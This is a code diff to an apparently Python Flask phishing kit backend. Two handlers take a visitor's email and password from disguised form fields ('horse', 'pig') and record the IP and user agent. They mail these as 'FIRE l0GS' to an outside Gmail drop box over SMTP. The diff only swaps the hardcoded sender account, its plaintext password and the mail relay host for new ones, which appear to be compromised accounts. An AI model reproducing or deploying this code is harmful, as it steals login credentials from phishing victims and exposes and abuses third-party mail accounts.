@@ -176,10 +176,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'claudio@brazilchinachamber.com'
-        sender_emaill = 'claudio'
+        sender_email = 'jester.erestain@amellar.com'
+        sender_emaill = 'jester.erestain'
         receiver_email = 'Justintimlakeland@gmail.com'
-        password = 'Acheipas123'
+        password = 'JesterEErestain152028*'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS ! 1'
@@ -198,7 +198,7 @@ def first():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP('mail.brazilchinachamber.com', 465) as server:
+        with smtplib.SMTP('mail.amellar.com', 465) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
@@ -217,10 +217,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'claudio@brazilchinachamber.com'
-        sender_emaill = 'claudio'
+        sender_email = 'jester.erestain@amellar.com'
+        sender_emaill = 'jester.erestain'
         receiver_email = 'Justintimlakeland@gmail.com'
-        password = 'Acheipas123'
+        password = 'JesterEErestain152028*'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS !! 2'
@@ -239,7 +239,7 @@ def second():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP('mail.brazilchinachamber.com', 465) as server:
+        with smtplib.SMTP('mail.amellar.com', 465) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
